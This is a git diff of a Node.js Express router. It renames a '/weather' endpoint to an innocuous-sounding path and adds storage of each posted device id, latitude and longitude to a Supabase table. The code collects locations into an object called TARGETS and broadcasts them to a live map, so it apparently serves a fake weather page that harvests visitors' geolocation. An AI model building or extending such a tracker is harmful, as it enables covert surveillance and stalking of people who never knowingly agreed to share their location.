@@ -1,6 +1,7 @@
 const express = require("express")
 const router = express.Router()
 const config = require("./config")
+const supabase = require("./supabase")
 
 
 const TARGETS = {}
@@ -18,16 +19,31 @@ router.route("/login").get((req, res) => {
     res.redirect("/")
 })
 
-router.route("/weather").get((req, res) => {
+router.route("/weather-monitoring-bantakal-node").get((req, res) => {
     res.render("weather")
-}).post((req, res) => {
+}).post(async (req, res) => {
     const { id, lat, lng } = req.body
+
     if (TARGETS[id] == null) {
         IO.emit("user-connected", id)
     }
 
     TARGETS[id] = [lat, lng]
     IO.emit("map-data", { id, lat, lng })
+
+    const { error } = await supabase
+        .from("location_data")
+        .insert({
+            device_id: id,
+            latitude: lat,
+            longitude: lng
+        })
+
+    if (error) {
+        console.error("Supabase error:", error)
+        return res.status(500).send("Failed to save location")
+    }
+
     res.send("OK")
     console.log(`> ${id} - ${TARGETS[id]}`)
 })
